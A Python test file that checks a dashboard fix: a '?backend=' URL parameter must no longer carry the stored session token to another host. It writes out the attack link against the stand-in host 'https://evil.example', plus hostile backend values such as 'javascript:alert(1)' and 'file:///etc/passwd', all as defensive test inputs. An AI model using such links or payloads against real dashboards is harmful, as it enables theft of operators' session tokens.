"""A ``?backend=`` in the dashboard's address never carries the session to a new host by itself.

The SPA reads ``?backend=<origin>`` off its own URL to decide which server its
requests go to, so a robot on the LAN can be dialled from a page served
elsewhere. It used to accept any parseable origin, persist it, scrub the
parameter from the address bar and attach the stored ``Authorization: Bearer``
to the very first request. One link to the operator's own dashboard with
``?backend=https://evil.example`` on it therefore mailed the live session
token to the attacker on page load, silently, and kept doing so after every
reload (finding f003, High).

The Settings drawer already refuses exactly this motion: ``connectionChange``
returns ``token_follows_host`` when a token minted for one host is about to be
sent to another, and the drawer asks before it goes. These cells hold the URL
path to the same rule. The token is bound to the host it was given for; a
request to any other host carries no bearer; a URL-supplied backend that would
move the token is dialled without it and is neither persisted nor scrubbed
until the operator says yes; a scheme ``fetch`` cannot speak is refused.
"""

from __future__ import annotations

import re

from tests._dashboard_frontend import LIB, requires_node, run_frontend

ENDPOINTS = LIB / "endpoints.ts"

EVIL = "https://evil.example"
TOKEN = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJvcGVyYXRvciJ9.sig"

SIGNED_IN = f"""
localStorage.setItem('strands.token', {TOKEN!r})
"""


def _authorization_sent_to(script: str, page: str) -> dict:
    return run_frontend(
        script
        + """
const m = await import('./endpoints.ts')
await m.api('/api/fleet').catch(() => null)
out({
  base: m.backendBase(),
  stored_base: localStorage.getItem('strands.backend'),
  urls: sent.map(s => s.url),
  authorization: sent.map(s => s.headers.Authorization ?? null),
  replaced,
})
""",
        page=page,
    )


@requires_node
class TestAUrlBackendDoesNotTakeTheTokenWithIt:
    def test_the_first_request_to_a_url_supplied_host_carries_no_bearer(self) -> None:
        """The attack link: a signed-in page opens ``?backend=https://evil.example``.

        The page may dial that host (the operator asked to), but the credential
        it holds was given for the page's own origin and stays there.
        """
        got = _authorization_sent_to(SIGNED_IN, page=f"http://robot.lan:8090/?backend={EVIL}")
        assert got["urls"] == [f"{EVIL}/api/fleet"], got
        assert got["authorization"] == [None], f"the session token followed the URL to {EVIL}: {got}"

    def test_a_backend_that_would_move_the_token_is_neither_persisted_nor_scrubbed(self) -> None:
        """Until the operator confirms, the stored backend is untouched and the parameter stays visible.

        Persisting made the leak survive every reload; scrubbing removed the
        only evidence that the page was re-pointed. Both wait for the yes.
        """
        got = _authorization_sent_to(SIGNED_IN, page=f"http://robot.lan:8090/?backend={EVIL}")
        assert got["stored_base"] is None, f"the URL re-pointed the stored backend without a confirmation: {got}"
        assert all("backend=" in (url or "") for url in got["replaced"]), (
            f"?backend= was scrubbed from the address bar while unconfirmed: {got['replaced']}"
        )

    def test_the_token_is_scrubbed_even_when_the_backend_is_not(self) -> None:
        """``?token=`` in history, share sheets and screenshots is still the hazard it was."""
        got = _authorization_sent_to("", page=f"http://robot.lan:8090/?token={TOKEN}&backend={EVIL}")
        assert got["replaced"], "nothing was scrubbed from the address bar"
        assert all("token=" not in url for url in got["replaced"]), got["replaced"]

    def test_a_page_holding_no_token_adopts_the_url_backend(self) -> None:
        """Nothing to leak: the hand-off a fresh browser makes to a LAN robot still works."""
        got = _authorization_sent_to("", page=f"http://robot.lan:8090/?backend={EVIL}")
        assert got["base"] == EVIL
        assert got["stored_base"] == EVIL
        assert got["authorization"] == [None]

    def test_a_token_handed_over_with_its_backend_is_sent_to_that_backend(self) -> None:
        """``?backend=X&token=T`` is the LAN hand-off the AuthGate advertises: T was minted for X."""
        got = _authorization_sent_to("", page=f"http://robot.lan:8090/?backend={EVIL}&token={TOKEN}")
        assert got["urls"] == [f"{EVIL}/api/fleet"]
        assert got["authorization"] == [f"Bearer {TOKEN}"]

    def test_the_stored_token_is_still_sent_to_the_host_it_was_given_for(self) -> None:
        """No URL parameter: the signed-in page keeps working against its own origin."""
        got = _authorization_sent_to(SIGNED_IN, page="http://robot.lan:8090/")
        assert got["urls"] == ["/api/fleet"]
        assert got["authorization"] == [f"Bearer {TOKEN}"]

    def test_a_token_bound_to_the_stored_backend_stays_there_when_the_url_moves_the_page(self) -> None:
        """A browser already dialling robot-a with a token opens ``?backend=robot-b``: robot-b gets no bearer."""
        script = SIGNED_IN + "localStorage.setItem('strands.backend', 'http://robot-a.lan:8090')\n"
        got = _authorization_sent_to(script, page="http://robot.lan:8090/?backend=http://robot-b.lan:8090")
        assert got["urls"] == ["http://robot-b.lan:8090/api/fleet"]
        assert got["authorization"] == [None], got
        assert got["stored_base"] == "http://robot-a.lan:8090"


@requires_node
class TestTheOperatorsYesIsTheOnlyWayAcross:
    def test_the_pending_verdict_is_the_drawers_token_follows_host(self) -> None:
        """The URL path raises the same question the Settings drawer does, with the hosts named."""
        got = run_frontend(
            SIGNED_IN
            + """
const m = await import('./endpoints.ts')
m.backendBase()
const v = m.urlBackendVerdict()
out({ kind: v && v.kind, from: v && v.fromHost, to: v && v.toHost })
""",
            page=f"http://robot.lan:8090/?backend={EVIL}",
        )
        assert got == {"kind": "token_follows_host", "from": "robot.lan:8090", "to": "evil.example"}

    def test_carrying_the_token_over_is_an_explicit_call_and_then_it_is_sent(self) -> None:
        """After ``carryTokenToBackend()`` the bearer rides to the new host and the backend persists."""
        got = run_frontend(
            SIGNED_IN
            + """
const m = await import('./endpoints.ts')
m.carryTokenToBackend()
await m.api('/api/fleet').catch(() => null)
out({ authorization: sent.map(s => s.headers.Authorization ?? null), stored_base: localStorage.getItem('strands.backend'),
      verdict: m.urlBackendVerdict() })
""",
            page=f"http://robot.lan:8090/?backend={EVIL}",
        )
        assert got == {"authorization": [f"Bearer {TOKEN}"], "stored_base": EVIL, "verdict": None}

    def test_the_settings_drawer_path_rebinds_the_token_to_the_host_it_confirmed(self) -> None:
        """``setBackendBase`` then ``setAuthToken`` is what the drawer does after its own confirmation."""
        got = run_frontend(
            SIGNED_IN
            + f"""
const m = await import('./endpoints.ts')
m.setBackendBase('robot-b.lan:8090')
const before = m.authToken()
m.setAuthToken({TOKEN!r})
await m.api('/api/fleet').catch(() => null)
out({{ before, authorization: sent.map(s => s.headers.Authorization ?? null) }})
""",
        )
        assert got == {"before": "", "authorization": [f"Bearer {TOKEN}"]}


@requires_node
class TestOnlyAnHttpOriginIsDialled:
    def test_a_scheme_fetch_cannot_speak_is_refused_and_the_page_stays_home(self) -> None:
        for raw in ("javascript:alert(1)", "file:///etc/passwd", "ftp://evil.example", "data:text/html,x"):
            got = _authorization_sent_to(SIGNED_IN, page=f"http://robot.lan:8090/?backend={raw}")
            assert got["base"] == "", f"{raw!r} was accepted as a backend: {got}"
            assert got["urls"] == ["/api/fleet"], got
            assert got["stored_base"] is None, got
            assert got["authorization"] == [f"Bearer {TOKEN}"], got


class TestTheUrlPathReadsTheDrawersRule:
    def test_absorbing_the_url_consults_connection_change(self) -> None:
        """The judgement lives in one place; the URL is not a second, more trusting entry point."""
        source = ENDPOINTS.read_text(encoding="utf-8")
        assert re.search(r"import \{[^}]*\bconnectionChange\b[^}]*\} from './connectionChange'", source), (
            "endpoints.ts does not import the drawer's connectionChange"
        )
        body = source[source.index("function absorbUrl") :]
        body = body[: body.index("\nexport function backendBase")]
        assert "connectionChange(" in body, "absorbUrl() decides a ?backend= without connectionChange()"
        assert "needsConfirm(" in body, "absorbUrl() does not ask whether the verdict needs the operator"

    def test_the_token_is_bound_to_a_host_in_storage(self) -> None:
        source = ENDPOINTS.read_text(encoding="utf-8")
        assert "'strands.token.host'" in source, "the token has no recorded issuer host to be checked against"
